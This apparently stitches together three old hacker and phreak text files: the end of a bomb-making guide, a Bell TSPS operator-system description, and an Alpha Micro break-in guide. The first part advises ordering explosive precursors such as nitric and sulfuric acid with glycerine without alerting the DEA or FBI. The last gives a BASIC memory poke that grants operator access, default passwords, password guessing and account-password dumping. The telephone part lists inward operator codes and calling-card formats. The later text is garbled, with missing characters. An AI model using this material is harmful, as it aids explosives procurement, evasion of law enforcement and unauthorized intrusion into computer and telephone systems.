When you get catalogs from different companies, compare their prices

and shipping charges. Make sure you don't order a set of chemicals

where it is obvious you are making something you don't want them to know

you are making. A suspicious order would be Nitric & Sulfuric acid and

glycerine. This would be obvious that you are going to produce nitro-

glycerine. Spread out your orders and orders between companies. Also

be careful of watched chemicals. The drug enforcement agency watches

certain orders for certain chemicals. They usually say something on the

order of under the listing of the chemical entry in the catalog "only

sold to established institutions." It just so happens that certain

explosive synthesis requires the chemicals as some illicit drug

production.



Go to your local library in the reference section. Get the THOMAS REGISTER

It is a set of books that list addresses of industrial suppliers. Look

under chemicals for addresses.



I do know of one company called Emerald City Chemical in Washington.

They only require that you be at least 18 years of age. No letterhead

necessary.



I suggest staying away from Fisher Scientific, Seargent Welch, Sigma &

Aldrich Chemical companies because they are either expensive, only sell

to schools, or watch for illegal or suspicious chemical orders. I noticed

that a lot of you phreaks out there live in New York; so stay away from

City Chemical Co. I was informed that they closely watch their customers

also.



Don't make some letterhead for Jo Blow's Sewing Machine Repair and order

complicated chemicals like 2,3,7,8-tetrachlorodibenzo-p-dioxin, bis-2-

ethylhexy-diadipate, 3,4-diaminofurazain, or pharmecitucal type chemicals

or any kind of chemical that looks like a foreign language. It looks

VERY suspicious and your address will be forwarded to your local FBI or

DEA office pronto. Nowadays you really got to watch what you order

thanks to our bleeding heart liberals worrying about kids blowing their

hands off trying to make firecrackers, or folks making controlled drugs in

their basements.

            ________________________________________



                            CONCLUSION



I hope this information is of some use to you. Just remember that it is

a federal offense to manufacture and transport explosives or explosive

devices without a B.A.T.F. licence.



Also keep in mind that if you do decide to make yourself some bombs,

just remember NOT TO TELL ANYONE! If you tell someone, that is just the

added risk of getting caught because your "buddie" was a stool pigeon.

BELIEVE ME - chances are if you tell someone, others will find out from

gossip and you will be the alias "mad bomber" of your town. If someone

happens to see any lab equipment or if your neighbors smell any strange

chemical smells around your home, they might even think you are making

drugs, so be careful. If you tell your friends of your activities, don't

be surprised if you see a gunmetal grey Dodge Diplomat with a dozen

antennas protruding from it sitting across the street with a guy in it

watching your house with a spotting scope...



DO NOT SELL explosives to ANYONE without a licence. If they get caught,

the feds will plea-bargan with them and find out where they got the

bombs and of course your buddie will tell them so he gets a reduced

sentence. They WILL get a search warrant with no problem and proceed

to ransack your premises. I know of a person that was in a similar

situation. He didn't have any explosives in his house, but they seized

his chemicals because of the complaint filed. Subsequently, the feds

kept up pretty good surveillance on him for quite a while.



Use this information with caution and don't blow yourself up!

1.0 Introduction

================



The purpose of this file is discuss and describe the general system

architecture and processing of certain calls handled in a Traffic Service

Position System (TSPS) No. 1B office.  From here after, any reference to the

anacronym - TSPS, will be used to describe the Traffic Service Position System

1B.  Wheras TSPS processes a wide variety of call types (listed below), this

file will deal primarily with only a few types which I feel to be of special

interest and importance to the phreak/hack community.  Future files on TSPS

will continue to expand upon the information presented here, and will discuss

additional call types and processing.



The types of calls, elected to be discussed in this file will fall primarily

within the three following categories:



        1)  Coin Station Calls (Payphone) and ACTS call processing.

        2)  Calling Card Service and Billed Number Screening.

        3)  Busy Line Verification

4.0 General Overview of Call Types

==================================



All call processing can be broadly thought of as the processing of a service

request (by an operator or a customer) thru connection, talking state, and

disconnection.  Call types can be classified into the following two major

groups: (Although no definite line can be drawn, in that the groups often

overlap each other.)



4.1  Customer Originated Calls

==============================



The first category of calls are those which can be classified as customer

originated. In an effort to keep with the three main types discussed here,

some of the call types listed will not be explained.



        4.1.1) 1+ Calls

        ===============

         - DDD calls

         - Calls with ANIF or ONI

         - H/M calls

         - CAMA calls

         - 900 Dial Line Service (DLS)..."Dial a Vote"

         - NonCoin transfers from offices with out billing equipment

         - Coin Calls...Discussed later in greater detail



        4.1.2)  0+ Calls

        ================

         - Calling Card Service (CCS) Calls

         - Billed Number Screening (BNS) Calls

         - Originating Station Treatment (OST)..Third Party Billing, Collect..



        4.1.3)  0- Calls

        ================

         - OPCR ...Standard RBOC(or Equivalent) "0" operator



        4.1.4)  International Call Handling (ICH) ...Overseas Calls

        ===========================================================



        4.1.5)  Automated Quotation Service and H/M calls

        =================================================





4.2  Operator Originated

========================



The second category of calls handled by TSPS are operator originated, and are

normally only initiated after a response to a customers request.  These calls

are of a nature that require operator intervention in order to complete.

Examples: BLV/EMG INT, collect, third party billing...



        4.2.1)  Special Operator Service Traffic (SOST)

        ===============================================

        - These include calls which must be transferred to a SOST switchboard

          before they can be processed. Examples: Conferences, Appointment,

          Mobile...



        4.2.2)  Delayed Calls

        =====================



        4.2.3)  Operator Service Calls

        ==============================

         - Customer/ Operator requested Rate and Route information ( RQS )



        4.2.4)  CAMA Transfer Calls

        ===========================

         - Includes ANIF and ONI

         - Transfers from areas without billing equipment



        4.2.5)  Busy Line Verification (BLV)

        ====================================

         - The Busy Line Verification allows a TSPS operator to process a

           customers request for a confirmation of a repeatedly busy line.

           This service is used in conjunction with Emergency Interrupts and

           will be discussed later in more detail.



        4.2.6)  Inward Calls

        ====================

         - An inward call requires a TSPS operator to provide services which

           the customers originating operator is not able to provide.  Ex:

           connection to a hard to reach number, BLV/EMG INT, CCS billing

           validation...An inward call can be originated with any of the

           following arrival codes:



                - 121  : NonCoin code...standard inward connection

                - 1150 : Coin code

                - 1155 : Noncoin with T&C code

                - 1160 : TSPS operator assisted inward CCS validation

                - 1161 : Automated inward CCS validation for non TSPS operator

                         with DTMF touch tone signaling.

                - 1162 : Automated inward CCS validation for non TSPS operator

                         with MF signaling.



                - Examples of the above codes:

                - KP+NPA+121+ST gets inward operator in NPA selected with only

                  INWD key illuminated, indicating call connected to position

                  in an inward call.



                - KP+1161+ST gets automated CCS validation that responds to

                  DTMF tones.









5.0  General Call Processing for Coin Stations and CCS

======================================================



This section will deal with the processing that occurs during all customer

initiated calls, and can be applied to both Coin and CCS calls.  The following

processes are presented in the order which they would normally be handled.



        5.1)  Trunk Seizure

        ===================

         - When a local office seizes a trunk in response to a customer request

           (i.e.- A customer has picked up the phone, placing it off-hook),

           current flows thru the circuit, changing the state of the ferrods

           (i.e.- scan points ) from an on-hook to an off-hook position.  When

           this change is determined by the PTS (Position and Trunk Scanner) at

           the RTA (Remote Trunk Arrangement) to be an actual off-hook

           transition, and not merely a flash (tapped switch hook), it is taken

           as a request for service.



        5.2)  Digit Reception

        =====================

         - After a trunk is seized the local office sends the called and

           calling number to the TSPS by means of MF pulsing.  A Base Remote

           Trunk is connect to the MF receiver, which then proceeds to outpulse

           the MF digits.  The digits are received and registered on ferrods by

           the PTA in the order in which they were received.  The called number

           is the number dialed by the customer and consists of either 7 or 10

           digits; the calling number is determined by the local office ANI

           equipment or by ONI, in case of ANIF.



        5.3)  Bridging a Position

         =========================

          - An idle occupied position is then bridged onto the call by a

            connection to the TSPS.  If operator service is required after

            connection to a position, the operator is prompted by a "zip" tone,

            and is alerted by a KIND OF CALL lamp, which provides information

            as to whether the call is coin, noncoin, 0+, 0-...If no operator

            service is required, the MF digits are outpulsed along the

            appropriate routing.



        5.4)  Call Connection

        =====================

         - If operator action was needed, upon the operators disconnect of the

           line (position released), the network connection between the the

           TSPS trunk and the base remote trunk is severed. The established

           through connection is now placed in a call floating (talking) state

           until disconnect.



        5.5)  Call Disconnection

        ========================

        - Both ends of a connected call are monitored for an off-hook state

          change, which upon indication,must occur long enough to be recognized

          as an actual disconnect (and not merely a flash...).  Another manner

          of disconnect is from a called party Time Released Disconnect (TRD),

          which is employed to limit billed party liability and release network

          connections.  Example: A customer requests a disconnect after x number

          of minutes, or after $x.xx.  The final action in a disconnect is to

          return the TSPS trunk to an idle position, which then awaits

          recognition of another service request.



        5.6)  AMA Data Accumulation and Reception

        =========================================


           registered, and prepared for billing.  The following is just some

           of  the information that is recorded on disk for processing.



                - Call Connect

                - Elapsed time

                - Signaling Irregularities

                - WalkAway Toggle (coin station fraud...discussed later)

                - Type of number billed









6.0  Coin Station Calls and ACTS Processing

==========================================



In general, coin station calls can be divided into 1+, 0+ and 0- originated

calls, not including 0+ and 0- CCS calls which will be discussed later in this

file.  All calls falling into these categories go through the following basic

operations, many of which were described in section 5 of this file. (The []

indicate operations that may or may not be present, depending on the type of

call placed)



        - 1) Trunk Seizure

        - 2) Digit Reception

        - 3) Bridging a Position [and Coin Detection and Announcement (CDA)]

        - 4) [Operation Action and] Digit Outpulsing.

        - 5) Talking Connection

        - 6) Call Disconnect

        - 7) AMA Processing







6.1  Automated Call Processing

==============================



All coin station calls requiring coin input from the customer are handled by

the Automated Toll Services (ACTS) which is implemented by the Station

Signaling and Announcement Subsystem (SSAS).  The SSAS automates the initial

contact on most 1+ (station paid) toll calls, by transmitting an announcement

requesting the initial deposit from the customer, and counting the deposits.

If an unusual delay occurs during the coin deposit period, the SSAS will prompt

the user for the remaining deposit needed to complete the call.  Upon

completion of sufficient deposit, SSAS provides an acknowledgement announcement

thanking the customer, and then causes the outpulsing of the called digits to

be handled by the Stored Program Control (SPC).  This delay in outpulsing

prevents free, short duration messages and keeps the audible ring of the called

party from interfering with coin detection signals.  Any customer over-deposit

is automatically credited towards overtime charges.  SSAS can accommodate

initial periods of up to 6 minutes, at the end of which the local office rate

schedule is accessed and announcement may or may not notify the customer of

the end of initial period.



 6.2  Operator Intervention

===========================



If at any time during the coin collection period, a customer fails to deposit

the sufficient funds (within a specified time period), or a flash is registered

on the switchhook, a TSPS operator will be bridged onto the call.  In this

event SSAS will monitor the coin deposits via a type I CDA circuit; however all

automated coin announcements will be suppressed.  All calls originating from

postpay coin stations must initially be handled by an operator, in that postpay

coin stations lack coin return equipment, and cannot return deposited coins

(i.e.- Postpay stations do not have a coin hopper, only a coin box).  This

physical restriction requires the operator to verify that the correct party has

been reached (and goes off-hook), before the customer makes any deposit.  Upon

verification, a type II CDA circuit is connected to count and monitor the coin

deposits.  This type of circuit is also connected whenever there is a large

amount of change associated with the call.  This is because the coin hoppers on

standard payphones, can only handle limited deposits.  If a deposit exceeds the

hopper limit, an operator will be bridged to the circuit to make a series of

partial collections.





6.3  SSAS Fully Automatic Criteria

==================================



The SSAS fully automates 1+ coin station calls (ACTS) if and only if all of the

following conditions are met.  Failure to meet any of these conditions results

in operator intervention.



        6.3.1)  ACTS Converted Trunk Group

        ==================================

        - Coin Stations must be converted to provide DTMF coin deposit signals

          that the CDA can recognize.



        6.3.2)  Machine Ratable

        =======================

        - The TSPS must receive sufficient rating information; failure to do so

          will result in operator intervention.



        6.3.3)  Successful ANI

        ======================

        - If ANIF or the call is ONI, an operator must be added to the circuit

          to record the calling number.



        6.3.4  Cannot Be a Postpay Station

        ==================================

        - See previous explanation of postpay stations (6.2).



        6.3.5  Cannot Have Large Charges

        ================================

         - See previous explanation (6.2).





6.4  Fraud Detection and Prevention

==================================



If a calling customer goes on-hook (hangs up), at the end of a conversation and

charges are still due, TSPS automatically sends a ringback signal to that

station in the attempt to get the customer to pick up the phone.  If the

calling party answers, an ACTS overtime charge message is made requesting the

customer to deposit the remaining amount due.  At any time during this message,

an operator may be connected to the circuit and harass the customer for payment

If however 5 rings with a 4 second interval occur without an off-hook state

change, TSPS assumes a walkaway, and a registered traffic counter is flagged,

a walkaway bit set, and the amount due is all registered as AMA data.



Whenever the called party is off-hook, ACTS is susceptible to generated coin

signals (Red Box Tones).  In an attempt to prevent this fraud, a special type

II CDA is employed: Two-wire trunks are isolated between forward and back party

to monitor coin deposits.  The talking path maintains conversation by being

routed through the type II CDA.  When coin signals are detected, the SSAS

informs TSPS that a called party fraud is suspected.  If more then one

detection occurs on one call, TSPS flags a fraud indicator on the calls AMA

record. NOTE:A trunk group may or may not detect and/or record this information

depending on office criteria.









7.0  Calling Card Service and Billed Number Service

===================================================



I am assuming that everyone reading this file has at least some concept of what

a calling card is and how it would be utilized from a local office. The CCS and
BNS services are implemented in TSPS by CCIS hardware, SSAS and several

processing programs that will not be discussed in this file (ABEGN, ACALL,

ASEQ...)  The CCS and BNS together provide for the customer an automated credit

card calling option that was initially implemented as an alternative to third

party billing, collect and large change calls.



In order for the CCS and BNS to function, they require that each TSPS becomes

a node on the SPC network, which then allows access to a nationwide database of

Billing Validation Applications (BVA).  The BVA currently consists of nodes

which are connected by CCIS, and are in turn made up of individual Billing

Validation Files (BVF).  A BVF is a file of data that is needed by the SPC and

associated database software to process queries about the data.  Each TSPS is

integrated into the SPC network and uses the CCIS direct signaling to access

the BVA.  Connected in parallel to the BVA is the Network Call Denial (NCD),

which allows the call denial to AT&T customers with outstanding bills.



The CCS billing number consists of a 10 digit billing number and a 4 digit

PIN.  There are two categories that a CCS billing number can fall into and

they are as follows:



        - 7.0.1)  Directory Billing Number

         =================================

         - The billing number is usually the directory number to which the

           card is billed, and is in the following format: NPA-NXX-XXXX :

           Where the NPA represents Numbering Plan Area, N is a digit 2-9, and

           X is a digit 0-9.



         - 7.0.2)  Special Billing Number

          ===============================

          - Wheras the typical CCS billing number is discribed above in 7.0.1,

            here exists a special type of billing number that bills the card to

            a special nondirectory billing number.  The format for this type of

            card is as follows: RAO-(0/1)-XX-XXXX :  Where the RAO is the

            Revenue Accounting Office code which assigns the billing number.

            The X represents a digit 0-9.



The PIN is a 4 digit number in the format of NYYY, where N is a digit 2-9, and

Y a digit 0-9.  Each PIN is designated upon assignment to the customer as

either restricted or unrestricted.  An unrestricted PIN can place calls to all

destinations.  If the called number is the same as the billing number, only the

4 digit PIN need be entered by the customer.  A restricted PIN can only be used

for station calls to the billing number.  NOTE: A special billing number

(section 7.0.2) can only have an unrestricted PIN.





The CCS can be broken down into two basic category of calling types and are as

follows:



7.1  Customer Dialed CCS Call

=============================



The customer initiates the CCS sequence by dialing a 0 + Called Number.  The

Called number can take the format of a 7 digit number, a 14 digit number or

01+ country code and national number.  This information, as well the calling

number (originating) is received by TSPS from the CO.  OST is then used to

determine whether CCS is available/given to the customer.  Based on the

determined OST features (Does phone have Touch Tone?  Is it a coin station?..),

TSPS either routes the call to an operator or provides an alerting tone and

announcement to prompt the customer for the CCS number (in the format discussed

in sec 7.0).  Assuming no operator intervention, the CCS number is subjected to

a series of checks and queries detailed below. (sec 7.3)



7.2 Operator Dialed CCS Call

============================



There are several ways a customer can receive operator assistance in CCS

dialing.



        - 7.2.1)  0- call.

        - 7.2.2)  0+ Called Number +0

        - 7.2.3)  0+ Called Number +Switch-hook flash.

        - 7.2.4)  0+ Called Number +No Action.

        - 7.2.5)  0+ Called Number +OST feature information requiring operator

          intervention. Example: Call placed from rotary phone...

        - 7.2.6)  0+ octothorpe.  A customer dials an octothorpe

         ( pound key "#") after the initial 0.



When the position is seized if the operator determines that a CCS call is

requested, the operator keys in the CCS number (or the PIN only) and call is

subjected to a series for checks for validity, detailed below (sec 7.3)



7.2.1  Non-TSPS Dailed CCS Call

===============================



The TSPS operators do not serve all CCS users.  Non-TSPS operators and

independent telephone companies also serve CCS customers, and must access the

BVA for validity checks.(Examples: mobile,marine,international...)  This access

to the BVA is provided for cordboards and independent telephone companies by

reaching a nearby TSPS, via TSPS base unit inward trunks.  A distant operator

may reach the BVA by any of the routing codes detailed in section 4.2.6, and

the CCS validation is subject to the same security checks detailed below.  If

a non-TSPS operator dials either KP+(1161 or 1162)+ST, the operator hears a CCS

alert tone, and then has one minute in which to dial the 14 digit CCS number.

The TSPS initiates a format check, an APF check (see 7.3), and access the BVA

to determine the status of the CCS number in question.  The following are the

different corresponding announcements which would follow:



        - Calling Card Service Number Accepted, PIN unrestricted

        - Calling Card Service Number Accepted, PIN restricted

        - Calling Card Service Number Accepted, RAO unknown

        - Calling Card Service Number Rejected



If a CCS number is accepted, the connection to the non-TSPS operator is

terminated by the TSPS.  If a rejection message results, the operator will be

prompted by the alert tone and may attempt to redial the CCS.





7.3  CCS Validation

===================



After the CCS billing number is keyed in (either by customer, TSPS operator,

or independent operator) the All PINs Fail (APF) feature may cause the card to

be rejected and the call to be halted.  The APF is a security feature designed

to frustrate attempts at discovering valid PINs by a brute force hack method

(trial and error).  A list of CCS validation failures is maintained, which is

updated with both invalid billing numbers and calling numbers.  When a number

of failures for a given billing number exceeds a specified threshold, in x

amount of time, all subsequent attempts are declared invalid for a certain

amount of time y (Lock Out Time).  Even if the actual PIN is used during the

lockout time, the CCS number would be considered invalid, and the call process

would be halted.





7.4  Billed Number Screening

============================



The BNS service applies to collect and third party billing calls placed

through a TSPS operator.  The BVF contains information designating certain

numbers as "collect denied" or "bill-to-third denied".  Each time an operator

attempts to place a collect or third party billing number a BVA and a NCD

inquiry are made.









8.0  Busy Line Verification

===========================



A dedicated network is provided to process BLV calls and traffic.  This network

originates at the TSPS base office and connects through dedicated trunks to

toll, intertoll, and local offices.  The equipment consists of the BLV trunk, a

TSPS-4 wire bridging repeater, a verification circuit at TSPS, InComing

Verification Trunks (ICVT), OutGoing Verification Trunks (OGVT) at both toll

and intertoll offices, and Incoming No Test Trunks (INTT) at local offices.

The TSPS gains access to a single local, toll, and/or intertoll office.



The initial request for a BLV appears as an position seizure to a TSPS operator

over an incoming trunk via a local office or as an inward trunk via a toll

office.  The initial loop seized becomes the originating loop and is connect in

position via an idle TSPS loop.  In that the originating loop cannot be

connected to the verification loop, the operator must switch between the two.



Security is maintained to insure that a customers privacy is not violated, and

consists of the following:



        - 8.0.1)  Speech Scrambler at Console Level (not BLV trunk level).

        - 8.0.2)  Alert Tone Generator (ATG).

        - 8.0.3)  Translation of the NPA to 0XX or 1XX.

        - 8.0.4)  Dedicated BLV trunks.

        - 8.0.5)  Cross office security checks at toll offices.



8.1  BLV Processing

===================



When a customer requests that a BLV be preformed on a certain number within

the TSPS's LAN the following actions are taken.



        - 8.1.1)  The TSPS attempts to DDD the number in question , to confirm

         that the number is indeed busy.  This action is preformed so that if

         in the event that an recorded error announcement is reached, the

         operator may understand the nature of the error without the speech

         scrambler interfering in quality.



        - 8.1.2)  If the line is confirmed to be busy and the customer requests

         further action, the operator then attempts verification through the

         BLV network. The operator then presses the VFY key, in which case an

         attempt at a BLV will be made if and only if the following conditions

         are met:



               - 8.1.2.1)  There is an idle loop at the position

                 ===============================================

                 - This condition must be met because the BLV trunk must be

                   placed in a loop with the Traffic Service Position.  If

                   there are no idle loops remaining the BLV cannot be

                   processed.  This condition can be gotten around by the

                   operator pressing the POS TRSFR key, which causes all the

                   calls in the hold state to be transferred to loops on the

                   original operator position.



                - 8.1.2.2)  The call is on an incoming/inward trunk

                   ================================================

                   - This insures that an operator cannot preform a BLV

                     without a originating customer request.



                - 8.1.2.3)  The called party is off-hook

                  ======================================

                  - See 8.1.2.2



                - 8.1.2.4)  The called number is a domestic number

                  ================================================

                   - That is the called number cannot be an overseas number.



                - 8.1.2.5)  The call has no forward connection

                  ============================================

                  - This ensures that the busy condition detected by the INTT

                    is not due to the connection of the calling party.



                - 8.1.2.6)  The line number can be verified

                  =========================================

                   - This condition would fail if the local office is

                     not served by the BLV network...



                   - ..or the number in question is excluded from BLV calls

                    (Example: Emergency or Police Lines...)



        8.1.3)  The BLV is preformed and the BLV trunk dropped by pressing

                the REC MSG key for an incoming call or VFY for an inward call.

The Alpha Micro computer is a fairly easy system to understand, for

those of you familiar with VAX systems.  The operating system (AMOS)

is a ripoff of the DEC stuff, so many commands are similar.  This is

a guide on how to use the Alpha.



Background on security:

---------- -- ---------



When the Alpha Micro leaves the factory, they do not have any type of

security feature built into it, except for certain higher end models,

which will be discussed later.  Thus, if the user installs a modem

directly to the system, and you call in, you'll be at the OS level

already.  Pretty easy, eh?



Due to the lack of a cursor display character, the pound sign (#) will

be used to represent the cursor throughout this document.  The prompt

for AMOS is a period, which users refer to as the dot.  Wnen you log on,

you'll see this:



        .#



At this point, you can type away and use the various accounts and

programs on the system.  When you first connect, depending on how the

last user left the modem, you may or may not be logged in to a

partition.  To verify this, type in the LOG command.



        .LOG



The computer will respond in one of two fashions.  If it says "Not

logged in", then you will have to log to an existing account.  If it

says "Current login is DSK1:[203,1]", then there is no need to scan

for an account right away.



Perhaps the most important thing to do after this is to do a SYSTAT,

which will let you know who else is on the system, and what account,

program is being run, and other info.  Example:



        .SYSTAT



Status of AMOS/L version 1.3D(165) on Friday, November 11, 1988 03:24:54 PM



JOB1  TRM1  DSK1:201,3  0067732 ^C CONECT 122880 bytes at 4505554

JOB2  TRM2  DSK0:1,2    0024984 TI SYSACT 176800 bytes at 4505554

JOB3  TRM3  Not logged  0015460 ^C MEMORY  12288 bytes at 3137554

MODEM HAYES DSK0:1,4    0037325 SL SYSTAT  67912 bytes at 2179023



4 jobs allocated on system, 3 jobs in use (3 logged in)

Total memory on system is 2048K bytes

System uptime is 07:28:19



DSK0        26402 blocks free                DSK1        3578 blocks free

4 devices on system, total of 29980 blocks free



        .#



Here's a quick rundown on what each column means...

Col 1: The name of the job

Col 2: The terminal to which the job is attached

Col 3: The device and account into which the job is logged

Col 4: The octal memory address where the JCB is located

Col 5: Terminal status of for that job

Col 6: Last program run by that job

Col 7: Number of bytes (decimal) of memory allocated

Col 8: Octal memory address for beginning memory partition



The rest is self explanatory.  The 5th column (terminal status) has

numerous codes which need to be given.  Here's the abbreviation and what

it stands for:



        TI        Terminal input wait state

        TO        Terminal output wait state

        LD        Program load state

        SL        Sleep state

        IO         I/O access other than terminal

        EW        External wait state

        RN        Running

        SP        Suspended state

        SW        Semaphore wait

        ^C        Control-C



The SYSTAT program can be used even when you are not logged in, which

is a plus if you wish to access an account without knowing the password.

There is another program, called STAT, but don't use this.  It

constantly updates the screen, and will mess you up if you're using a

modem.



Before going further, it should be mentioned on how the Alpha Micro

computer is structured.  On each system, a number of hard drives

subdivided into logical units are encountered.  These may be named in

any fashion by the sysop, following only the limitation of the LU being

three letters or less in length.  This is then followed by the device

number.  Sample LU's may look like:  DSK0:, DSK1:, WIN0:, HWK3:, etc.



On each disk is found a grouping of accounts, also known as partitions,

or PPN's (project, programmer number).  It is in these accounts where

you log in to, and execute programs.  These are enclosed in square

brackets [], to separate them from the disk specification.  When used

all togther, it looks like this:



DSK0:[1,2], DSK0:[1,4], WIN3:[100,0], DSK4:[377,7]

You have to be careful with how the programs are used.  If done

inappropriately, you could do major damage to the computer.  Many of

the above programs can only be executed from the operator account

DSK0:[1,2].





+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



Entering via BASIC:



There is a back door in the version of BASIC that comes bundled with

AMOS.  Depending on the type of security present, you can gain access

to the system operator account (DSK0:[1,2]), which gives you the power

to do quite a few things.  What the command essentially does is poke

into memory the appropriate values to give you sysop access.



Type this in at the dot prompt (.) :



.BASIC



AlphaBASIC Version 1.3 (217)



READY



#



Once inside BASIC, type in this command as seen below;  it doesn't

matter if you use upper or lower case.



WORD(WORD(1072)+20)=258



BYE



.#



The BYE command exits you out of BASIC and puts you back at the

OS level.  You can also rename files and open files via BASIC.



Depending on the security in the system, if you typed in everything

as above, you should be logged into DSK0:[1,2], also known as OPR:.

This is the system operator's account, from which all types of

commands can be issued.



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



When you finally get connected to the system, you need some place to log

in to.  There are certain default accounts on every system.  These are:



        OPR:  --> DSK0:[1,2]                SYS:  --> DSK0:[1,4]

        DVR:  --> DSK0:[1,6]            CMD:  --> DSK0:[2,2]

        LIB:  --> DSK0:[7,0]                HLP:  --> DSK0:[7,1]

           BOX:  --> DSK0:[7,2]                BAS:  --> DSK0:[7,6]

        MAC:  --> DSK0:[7,7]



While logging around to the different accounts, some will have defined

"ersatz" names.  This means that besides the [p,pn] specification, you can

access that account with a defined name.  In the above examples, logging

into SYS: is the same as logging into DSK0:[1,4].





As mentioned previously, older models of the Alpha Micro did not have any

security built in to them.  Later versions of the operating have changed

this, though.  Once you get connected and you try to log into an account,

you may be asked for a password.  The word you type is not echoed on your

screen.  Two default passwords that you can try for logging purposes are

"DEMO" and "SYSTEM SERVICE".  These are not case-sensitive, so you can

type them in either upper or lower case.  If neither of these work (which

is unlikely, since people are too lazy to change them), try running the

SYSTAT command.



What happens is that you will often see people logged in under a short

(6 digits or less) user name, such as JOHN, AMY, SUSAN, etc.  Try logging

in with one of these as your PW.  80 per cent of the time it will work.



If you've gotten into the system this far, then good.  There are lots

of things to do or access.  If you're looking around for information,

these are contained in files that end in a .TXT extension.  These may be

examined by using the TYPE command from AMOS.  The syntax would be:



        .TYPE MODEM.TXT/P



The /P is not required, but is useful, because otherwise the file would be

diaplayed too quickly for you to look at.  The /P switch displays the

contents one page at a time.  Pressing <RET> will scroll through the text.

One word of warning:  Don't use the TYPE command on .LIT, .SBR, or .OBJ

files; doing so will usually result in your terminal being locked up,

effectively ending your session.



Now let's say you wanted to check out the files that are in other accounts.

Usually all that is needed is to simply log there.  However, certain

accounts will be passworded.  There is no simple way to just dump the

contents of a disk block and see what the PW is.  There are alternatives,

however.  One method is to log into the operator account (DSK0:[1,2]) and

use the SYSACT command.  This lets you to various things to the disk, but

the one you would be concerned about lists all of the accounts on a parti-

cular disk.  The command works like this:



        .#

        .SYSACT DSK0:



Use the "H" to get a listing of all the available commands from within

SYSACT.

        Implemented commands are:

        A PPN        - Add a new account

        C PPN         - Change password of an account

        D PPN        - Delete an account

        L        - List current accounts



The last one "L" is the one we're concerned with.  Press <RET> after it to

see a listing of all the accounts on the disk.  Passwords (if any) will be

displayed to the right.  The "C" option will allow you to change the PW on

an individual account.  Then press "E" to go back to the command level.



If you want to check out a file a little less elegantly, this may be done

by simply copying the file to an unpassworded account or by typing the

file from another account.



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



Account and file structure:



As explained before, there are accounts on the disk, which may or may not

contain files in them.  AMOS maintains this account structure on the disk.

In fact, a listing of which files belong in what account are kept track of

in the account directory.



There are two types of files that are possible on the Alpha Micro:

sequential (linked) and random (contiguous) files.  Each block is 512 bytes

y.  Files may not overlap

onto another disk, and each disk block has a unique number by which it is

referenced to via AMOS.



The format of most Alpha files are sequential -- AMOS reads in each disk

block of the file, which tells it the disk address of the next disk block.

The key point is that to access one block of data, you have to access all

preceding blocks.



When AMOS writes a sequential file to the disk, it looks for the first free

disk block.  It writes a copy of the first file block into that disk

location.  Next, it looks for another free disk block.  This next disk block

may or may not be anywhere near the first block used.  This process goes on

until the entire file is transferred to the disk.  The disk blocks that make

up the file may be scattered across the disk.  Each disk block in the file

contains a portion of the file; it also contains the address of the next

disk block used by the file.



              *-----------*-----------*

              | Address of| Data in   |

              | next block| file block|

              *-----------*-----------*



Sequential files are also called linked files because the disk blocks are

linked together by the information in each block that points to the address

of the next disk block.  The last block in the file is designated as such

by a link of zero.  It looks like this:



                                                     /---X

     /----------------X       /----------------X     !    |

     !                 !      !                 !    !    X

*-----------*--------* ! *-----------*--------* !  *----------*-------*

| Address of|  DATA  | ->| Address of|  DATA  | !->|  EOF     | DATA  |

| next block|        |   | next block|        |    | Zero link|       |

*-----------*--------*   *-----------*--------*    *----------*-------*





Random files differ from their sequential counterparts because the data in

them can be accessed randomly.  AMOS knows how long the files are, and also

knows exactly where the files begin on the disk.  The operating system can

therefore access any block in a file by computing an offset value from the

front of the file, and then reading the proper disk location.  The distinc-

tion between random and sequential is that since the disk blocks don't have

to be accessed in any particular order, AMOS can locate specific data in a

file quicker.



When a random file is written to disk, the first free groups of contiguous

blocks are searched for which are large enough to hold the entire file.  If

there aren't enough blocks on the disk, the message "Disk full" appears.

Random files look something like this:





  *---------------*---------------*---------------*---------------*

  | File block #1 | File block #2 | File block #3 | File block #4 |

  *---------------*---------------*---------------*---------------*



One a random file is allocated on the disk, it is not possible to expand it.

Random files are used mainly for applications where the file length remains

constant.





The first block on a disk (block 0) is the disk ID block.  Alpha Micros use

this disk block to maintain permanent identification information about the

disk.  The next block (block 1) is the Master File Directory (MFD).  At

block 2 lies the disk bitmap.  The bitmap is the structure that keeps track

of which blocks on the disk are in use, and which are available.  The

bitmap contains one bit for each block on the disk.  If a block is in use,

the bit in the bitmap that represents that disk block is a 1; if the block

is available for use, its bit in the bitmap is a 0.  The bitmap is perma-

nently stored on the disk beginning with block 2 and extending as far as

necessary.  The last two words in te bitmap form a hash total.  If some

data in the bitmap becomes destroyed, then there is a chance that data

corruption has occurred.  The ocre for writing data to the disk is:



   [1] Find in memory a copy of the bitp of the disk to be accessedd.

   [2] Computer the hash total of the bitmap & check agains the sh.

   [3] Consult bitmap to see the next free block.

   [4] Change bitmap to shockthe block is in use.

   [5] Recompute bitmap hash to reflect the modified bmap.

   [6] Write modified bitmap back out to the disk.

   [7] Write thata to the chosen block.



Every disk contains one Master File Directory (MF  Each disk contains

one MFD.  The MFD is one block long, and contains e entry of four words

for each user account allocated on that disk.  This ps the limitation

of having a maximum of 63 user accounts per disk.



Each try in the MFD identifies a specific acct directory.  Individual

account dectories are known as User File Directories (UFDs).  The entry

contains thccount PPN, number of the first block used by the UFD, and

a password assned (if any).  The MFD contains one entry for every UFD

on the disk.One UFD exists for each user account; it contains one entry

for eachlein that account.  These contain various sorts of information

relating tthe file.  A UFD may consist of more than one disk block; if

it is larger than oblock, the first word of the FD is nzero and gives the link

to the next UFD bock.



++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



Since the existing security  the Alpha Micro is lax, third party

comiehave wriiten their own sceurity systems, making it considerably

more dicult to access a system.  However, all is not lost.  There are a

few wato make things easier.



Default passwords are the first step.  One of the security systems, known

as TSASS, has the default passwords of MAL, MAL, MAL for its prompts.  You

will know that you've encounted an Alpha Micro running TSASS by the

message: "Welcome to a Time Shar and Security System".  Another security

package, UltraSafe, has the dult PW's of OPR, OPR, OPR.  An UltraSafe

system is harder to recognize because the prompts can be changed, although

some more common ones ask for  NAME, PORD, and GROUP.



The next option is if you have found a password that lets you in, it may be

one of low security.  This can automatically chain you into a menu or shell

program.  Depending onw the system is configure, a string of Control C'or any

other key sequence) can mess up the buffer, automatically causing

e curity system to crash, and bringing you to AMOS, without being

